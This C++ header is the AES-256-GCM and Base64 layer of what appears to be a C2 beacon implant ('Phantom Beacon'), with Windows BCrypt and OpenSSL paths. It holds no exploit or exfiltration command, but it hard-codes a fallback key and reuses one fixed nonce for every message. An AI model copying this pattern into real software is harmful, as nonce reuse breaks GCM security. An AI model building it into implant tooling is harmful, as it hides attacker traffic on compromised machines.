#pragma once
// ============================================================================
//  crypto.h — Phantom Beacon Cryptographic Layer (Cross-Platform)
//  ──────────────────────────────────────────────────────────────────────
//  Authenticated Encryption: AES-256-GCM.
//  Windows: BCrypt native. POSIX: OpenSSL.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <bcrypt.h>
    #pragma comment(lib, "bcrypt.lib")
    #ifndef NT_SUCCESS
    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
    #endif
    typedef unsigned long ULONG;
#else
    #include <openssl/evp.h>
    #include <openssl/err.h>
    typedef unsigned char BYTE;
    typedef unsigned int ULONG;
#endif
#include <vector>
#include <string>
#include <cstring>


namespace crypto {

// ── Key Material ────────────────────────────────────────────────────────────
// Generated at compile time from .env via phantom.utils.c2_crypto.
#if __has_include("crypto_config.h")
    #include "crypto_config.h"
#else
    static const BYTE AES_KEY[]   = "PhantomC2_SecretKey_32bytes_Long";
    static const BYTE AES_NONCE[] = "PhntmNonce12";
#endif

constexpr ULONG KEY_LEN   = 32;
constexpr ULONG NONCE_LEN = 12;
constexpr ULONG TAG_LEN   = 16;

// ── Base64 Encode/Decode ───────────────────────────────────────────────────

static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

inline std::string base64_encode(const std::vector<BYTE>& data) {
    std::string out;
    out.reserve(((data.size() + 2) / 3) * 4);
    for (size_t i = 0; i < data.size(); i += 3) {
        uint32_t n = (static_cast<uint32_t>(data[i]) << 16);
        if (i + 1 < data.size()) n |= (static_cast<uint32_t>(data[i + 1]) << 8);
        if (i + 2 < data.size()) n |= static_cast<uint32_t>(data[i + 2]);
        out += B64_TABLE[(n >> 18) & 0x3F];
        out += B64_TABLE[(n >> 12) & 0x3F];
        out += (i + 1 < data.size()) ? B64_TABLE[(n >> 6) & 0x3F] : '=';
        out += (i + 2 < data.size()) ? B64_TABLE[n & 0x3F] : '=';
    }
    return out;
}

inline std::vector<BYTE> base64_decode(const std::string& enc) {
    int T[256];
    memset(T, -1, sizeof(T));
    for (int i = 0; i < 64; ++i) T[static_cast<unsigned char>(B64_TABLE[i])] = i;

    std::vector<BYTE> out;
    out.reserve(enc.size() * 3 / 4);
    uint32_t val = 0;
    int bits = -8;
    for (unsigned char c : enc) {
        if (T[c] == -1) continue;
        val = (val << 6) | T[c];
        bits += 6;
        if (bits >= 0) {
            out.push_back(static_cast<BYTE>((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

// ── AES-256-GCM Encrypt ────────────────────────────────────────────────────

inline std::string encrypt(const std::string& plaintext) {
#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BYTE nonce[NONCE_LEN];
    memcpy(nonce, AES_NONCE, NONCE_LEN);

    BYTE tag[TAG_LEN];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_LEN;
    authInfo.pbTag = tag;
    authInfo.cbTag = TAG_LEN;

    ULONG cbCiphertext = (ULONG)plaintext.size();
    std::vector<BYTE> ciphertext(cbCiphertext);

    status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), &authInfo, nullptr, 0, ciphertext.data(), cbCiphertext, &cbCiphertext, 0);
    if (NT_SUCCESS(status)) {
        // Append tag to ciphertext (matching Python's cryptography library behavior)
        ciphertext.insert(ciphertext.end(), tag, tag + TAG_LEN);
        result = base64_encode(ciphertext);
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> ciphertext(plaintext.size());
    int len = 0;
    int ciphertext_len = 0;
    BYTE tag[TAG_LEN];

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) goto cleanup;
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) goto cleanup;
    if (1 != EVP_EncryptInit_ex(ctx, NULL, NULL, AES_KEY, AES_NONCE)) goto cleanup;

    if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, (const BYTE*)plaintext.data(), plaintext.size())) goto cleanup;
    ciphertext_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) goto cleanup;
    ciphertext_len += len;

    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag)) goto cleanup;
    
    ciphertext.resize(ciphertext_len);
    ciphertext.insert(ciphertext.end(), tag, tag + TAG_LEN);
    
    EVP_CIPHER_CTX_free(ctx);
    return base64_encode(ciphertext);

cleanup:
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    return "";
#endif
}

// ── AES-256-GCM Decrypt ────────────────────────────────────────────────────

inline std::string decrypt(const std::string& ciphertext_b64) {
    std::vector<BYTE> full_data = base64_decode(ciphertext_b64);
    if (full_data.size() < TAG_LEN) return "";

    // Extract tag from the end
    std::vector<BYTE> ciphertext(full_data.begin(), full_data.end() - TAG_LEN);
    BYTE tag[TAG_LEN];
    memcpy(tag, full_data.data() + ciphertext.size(), TAG_LEN);

#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BYTE nonce[NONCE_LEN];
    memcpy(nonce, AES_NONCE, NONCE_LEN);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_LEN;
    authInfo.pbTag = tag;
    authInfo.cbTag = TAG_LEN;

    ULONG cbPlaintext = (ULONG)ciphertext.size();
    std::vector<BYTE> plaintext(cbPlaintext);

    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, plaintext.data(), cbPlaintext, &cbPlaintext, 0);
    if (NT_SUCCESS(status)) {
        result = std::string(plaintext.begin(), plaintext.begin() + cbPlaintext);
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> plaintext(ciphertext.size());
    int len = 0;
    int plaintext_len = 0;

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) goto cleanup;
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) goto cleanup;
    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, AES_KEY, AES_NONCE)) goto cleanup;

    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size())) goto cleanup;
    plaintext_len = len;

    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag)) goto cleanup;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len)) goto cleanup;
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return std::string(plaintext.begin(), plaintext.begin() + plaintext_len);

cleanup:
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    return "";
#endif
}

}  // namespace crypto
